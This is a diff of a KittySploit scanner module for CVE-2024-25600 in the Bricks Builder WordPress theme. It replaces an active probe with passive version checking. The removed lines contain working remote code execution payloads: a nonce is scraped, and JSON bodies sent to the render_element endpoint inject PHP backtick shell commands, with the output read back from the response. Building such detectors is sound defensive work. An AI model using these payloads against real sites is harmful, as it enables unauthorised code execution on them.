@@ -2,17 +2,22 @@
 # -*- coding: utf-8 -*-
 
 import re
+from typing import Tuple
 
 from kittysploit import *
 from lib.protocols.http.http_client import Http_client
+from lib.protocols.http.wordpress import Wordpress
+
+_THEME = "bricks"
+_VULN_HIGH = (1, 9, 6)
 
 
-class Module(Scanner, Http_client):
+class Module(Scanner, Http_client, Wordpress):
     __info__ = {
         "name": "Bricks Builder CVE-2024-25600 detection",
         "description": (
-            "Detects potential unauthenticated RCE in Bricks Builder by extracting the frontend nonce "
-            "and optionally running a harmless render_element marker probe."
+            "Detects WordPress Bricks theme <= 1.9.6 affected by CVE-2024-25600 "
+            "(unauthenticated render_element RCE)."
         ),
         "author": ["watchTowr", "KittySploit Team"],
         "severity": "high",
@@ -25,131 +30,85 @@ class Module(Scanner, Http_client):
             "exploits/multi/http/bricks_builder_cve_2024_25600_rce",
         ],
         "tags": ["web", "scanner", "wordpress", "bricks", "rce"],
-    'agent': {
-        'risk': 'active',
-        'effects': ['network_probe'],
-        'expected_requests': 2,
-        'reversible': True,
-        'approval_required': False,
-        'produces': ['tech_hints', 'risk_signals', 'endpoints'],
-    },
+        "agent": {
+            "risk": "active",
+            "effects": ["network_probe"],
+            "expected_requests": 2,
+            "reversible": True,
+            "approval_required": False,
+            "produces": ["tech_hints", "risk_signals", "endpoints"],
+            "cost": 1.0,
+            "noise": 0.2,
+            "value": 1.0,
+        },
     }
 
     base_path = OptString("/", "WordPress base path", required=False)
-    payload_type = OptString("code", "Payload type: carousel|container|generic|code", required=False)
-    pretty = OptBool(False, "Use pretty endpoint (/wp-json/...) instead of rest_route", required=False)
-    post_id = OptString("1", "postId value used by render_element", required=False)
-    active_probe = OptBool(True, "Send active marker probe to confirm command execution", required=False)
-    marker = OptString("KS25600", "Marker used by active probe", required=False, advanced=True)
 
-    def _prefix(self) -> str:
-        bp = str(self.base_path or "/").strip()
-        if not bp.startswith("/"):
-            bp = "/" + bp
-        return bp.rstrip("/")
+    def _wp_base(self) -> str:
+        return self.wp_normalize_base_path(self.base_path or self.path or "/")
 
-    def _nonce_path(self) -> str:
-        p = self._prefix()
-        return f"{p}/" if p else "/"
+    def _path(self, suffix: str) -> str:
+        base = self._wp_base()
+        if not suffix.startswith("/"):
+            suffix = "/" + suffix
+        return f"{base}{suffix}" if base != "/" else suffix
 
-    def _render_path(self) -> str:
-        p = self._prefix()
-        if self.pretty:
-            return f"{p}/wp-json/bricks/v1/render_element" if p else "/wp-json/bricks/v1/render_element"
-        return f"{p}/?rest_route=/bricks/v1/render_element" if p else "/?rest_route=/bricks/v1/render_element"
-
-    @staticmethod
-    def _extract_nonce(html: str) -> str:
-        if not html:
-            return ""
-        m = re.search(r'"nonce":"([a-fA-F0-9]+)"', html)
-        return m.group(1) if m else ""
-
-    def _build_probe_payload(self, nonce: str, command: str) -> dict:
-        payload_command = f'throw new Exception(`{command}` . "END");'
-        base = {"postId": str(self.post_id), "nonce": nonce}
-        query_settings = {"useQueryEditor": True, "queryEditor": payload_command}
-        templates = {
-            "carousel": {
-                **base,
-                "element": {"name": "carousel", "settings": {"type": "posts", "query": query_settings}},
-            },
-            "container": {
-                **base,
-                "element": {"name": "container", "settings": {"hasLoop": "true", "query": query_settings}},
-            },
-            "generic": {
-                **base,
-                "element": "1",
-                "loopElement": {"settings": {"query": query_settings}},
-            },
-            "code": {
-                **base,
-                "element": {
-                    "name": "code",
-                    "settings": {"executeCode": "true", "code": f"<?php {payload_command} ?>"},
-                },
-            },
-        }
-        pt = str(self.payload_type or "code").strip().lower()
-        return templates.get(pt, templates["code"])
-
-    @staticmethod
-    def _extract_exec_output(response) -> str:
-        if not response or response.status_code != 200:
-            return ""
-        try:
-            body = response.json() or {}
-            html_content = ((body.get("data") or {}).get("html")) or ""
-        except Exception:
-            html_content = response.text or ""
-        m = re.search(r"Exception: (.*?)END", html_content, re.DOTALL)
-        return m.group(1).strip() if m else ""
+    def _fetch_theme_version(self) -> Tuple[str, str]:
+        candidates = [
+            self._path(f"/wp-content/themes/{_THEME}/style.css"),
+            self._path(f"/wp-content/themes/{_THEME}/readme.txt"),
+        ]
+        for path in candidates:
+            response = self.http_request(method="GET", path=path, allow_redirects=True)
+            if not response or response.status_code != 200:
+                continue
+            body = response.text or ""
+            for pattern in (
+                r"Version:\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
+                r"Stable tag:\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
+            ):
+                match = re.search(pattern, body, re.IGNORECASE)
+                if match:
+                    return match.group(1).strip(), path
+            if "bricks" in body.lower():
+                return "", path
+        return "", ""
 
     def run(self):
         try:
-            home = self.http_request(method="GET", path=self._nonce_path(), timeout=10, allow_redirects=True)
-            if not home or home.status_code != 200:
+            version, evidence_path = self._fetch_theme_version()
+            if not evidence_path:
                 return False
 
-            nonce = self._extract_nonce(home.text or "")
-            if not nonce:
-                return False
-
-            if not self.active_probe:
+            if version:
+                if self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
+                    self.set_info(
+                        severity="critical",
+                        cve="CVE-2024-25600",
+                        reason=(
+                            f"Bricks {version} detected at {evidence_path}; "
+                            f"<= {_VULN_HIGH[0]}.{_VULN_HIGH[1]}.{_VULN_HIGH[2]} "
+                            "is within CVE-2024-25600 affected range"
+                        ),
+                        version=version,
+                        service="wordpress",
+                    )
+                    return True
                 self.set_info(
-                    severity="medium",
-                    cve="CVE-2024-25600",
-                    reason="Bricks nonce found; active probe disabled",
+                    severity="info",
+                    reason=f"Bricks {version} detected; appears patched for CVE-2024-25600",
+                    version=version,
+                    service="wordpress",
                 )
-                return True
+                return False
 
-            marker = str(self.marker or "KS25600")
-            probe_payload = self._build_probe_payload(nonce, f"echo {marker}")
-            response = self.http_request(
-                method="POST",
-                path=self._render_path(),
-                headers={"Content-Type": "application/json"},
-                json=probe_payload,
-                timeout=max(int(self.timeout or 10), 10),
+            self.set_info(
+                severity="medium",
+                cve="CVE-2024-25600",
+                reason=f"Bricks theme detected at {evidence_path}, but version could not be extracted",
+                service="wordpress",
             )
-            out = self._extract_exec_output(response)
-            if marker in out:
-                self.set_info(
-                    severity="critical",
-                    cve="CVE-2024-25600",
-                    reason="Nonce extracted and marker command executed via render_element",
-                )
-                return True
-
-            if response and response.status_code == 200:
-                self.set_info(
-                    severity="high",
-                    cve="CVE-2024-25600",
-                    reason="Nonce extracted and render_element responded, but marker output not confirmed",
-                )
-                return True
-
-            return False
+            return True
         except Exception:
             return False
